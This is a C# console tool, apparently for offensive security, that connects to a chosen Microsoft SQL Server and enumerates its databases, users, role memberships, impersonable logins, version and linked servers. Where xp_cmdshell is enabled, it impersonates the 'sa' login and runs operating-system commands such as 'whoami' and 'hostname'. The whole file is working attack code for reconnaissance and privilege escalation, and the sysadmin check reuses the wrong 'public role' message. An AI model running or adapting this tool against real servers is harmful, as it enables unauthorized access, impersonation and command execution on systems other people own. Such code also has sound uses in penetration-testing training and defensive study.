using System;
using System.IO;
using System.Text;
using System.Data.SqlClient;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SqlEnum
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[*] Enter target sql server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter target database: ");
            String sqlDatabase = Console.ReadLine();
            String sqlConn = $"Server = {sqlServer}; Database = {sqlDatabase}; Integrated Security = True;";
            SqlConnection conn = new SqlConnection(sqlConn);

            try
            {
                conn.Open();
                Console.WriteLine("[+] Authentication successful");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failure");
                Environment.Exit(0);
            }

            Console.WriteLine("[!] Enumerating database");
            String db = "select db_name();";
            SqlCommand cmd = new SqlCommand(db, conn);
            SqlDataReader read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Current db: {read[0]}");
            read.Close();

            Console.WriteLine("[!] Enumerating hostname");
            String host = "select host_name();";
            cmd = new SqlCommand(host, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Hostname: {read[0]}");
            read.Close();

            Console.WriteLine("[!] Enumerating db users");
            String users = "select * from master.sys.database_principals;";
            cmd = new SqlCommand(users, conn);
            read = cmd.ExecuteReader();
            
            while (read.Read())
            {
                Console.WriteLine($"[+] DB user: {read[0]} found");
            }
            read.Close();

            Console.WriteLine("[!] Enumerating current user");
            String login = "select user_name();";
            cmd = new SqlCommand(login, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Current user: {read[0]}");
            read.Close();

            String user = "select system_user;";
            cmd = new SqlCommand(user, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Mapped user: {read[0]}");
            read.Close();

            Console.WriteLine("[!] Enumerating user privileges");
            String pub = "select is_srvrolemember('public');";
            cmd = new SqlCommand(pub, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Int32 role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of public role");
            }
            read.Close();

            String adm = "select is_srvrolemember('sysadmin');";
            cmd = new SqlCommand(adm, conn);
            read = cmd.ExecuteReader();
            read.Read();
            role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of public role");
            }
            read.Close();

            Console.WriteLine("[!] Checking for user impersonation");
            String query = "select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate';";
            cmd = new SqlCommand(query, conn);
            read = cmd.ExecuteReader();

            while (read.Read() == true)
            {
                Console.WriteLine($"[+] {read[0]} can be impersonated");
            }
            read.Close();

            Console.WriteLine("[!] Enumerating mssql version");
            String ver = "select @@version;";
            cmd = new SqlCommand(ver, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Target server version: \n\n{read[0]}");
            read.Close();

            Console.WriteLine("[!] Enumerating xp_cmdshell");
            String xp_cmdshell = "select convert(int, isnull(value, value_in_use)) as config_value from sys.configurations where name='xp_cmdshell';";
            cmd = new SqlCommand(xp_cmdshell, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Int32 enabled = Int32.Parse(read[0].ToString());

            if (enabled == 1)
            {
                read.Close();
                Console.WriteLine("[+] xp_cmdshell is enabled");
                Console.WriteLine("[!] Checking command execution");

                try
                {
                    String impersonate = "execute as login = 'sa';";
                    cmd = new SqlCommand(impersonate, conn);
                    read = cmd.ExecuteReader();
                    read.Close();

                    String command = "exec xp_cmdshell 'whoami';";
                    cmd = new SqlCommand(command, conn);
                    read = cmd.ExecuteReader();
                    read.Read();
                    Console.WriteLine($"[+] Target system user: {read[0]}");
                    read.Close();

                    command = "exec xp_cmdshell 'hostname';";
                    cmd = new SqlCommand(command, conn);
                    read = cmd.ExecuteReader();
                    read.Read();
                    Console.WriteLine($"[+] Target system hostname: {read[0]}");
                    read.Close();
                }
                catch (Exception e)
                {
                   Console.WriteLine("[-] Command execution failed");
                }
            }
            else
            {
                Console.WriteLine("[-] xp_cmdshell is NOT enabled");
            }
            read.Close();

            Console.WriteLine("[!] Enumerating server links");
            String link = "exec sp_linkedservers;";
            cmd = new SqlCommand(link, conn);
            read = cmd.ExecuteReader();

            while (read.Read())
            {
                Console.WriteLine($"[+] Linked server {read[0]} found");
            }
            read.Close();

            Console.WriteLine("[*] Enumeration complete!");
            conn.Close();
        }
    }
}